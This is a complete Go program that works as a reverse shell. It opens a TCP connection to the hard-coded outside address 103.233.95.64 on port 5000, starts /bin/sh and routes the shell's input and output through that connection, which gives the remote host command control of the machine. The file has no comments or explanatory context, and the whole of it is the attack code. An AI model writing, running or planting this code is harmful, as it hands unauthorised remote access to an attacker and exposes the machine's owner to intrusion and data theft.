package main

import (
	"net"
	"os/exec"
)

func main() {
	conn, err := net.Dial("tcp", "103.233.95.64:5000")
	if err != nil {
		panic(err)
	}
	cmd := exec.Command("/bin/sh")

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	cmd.Run()
}
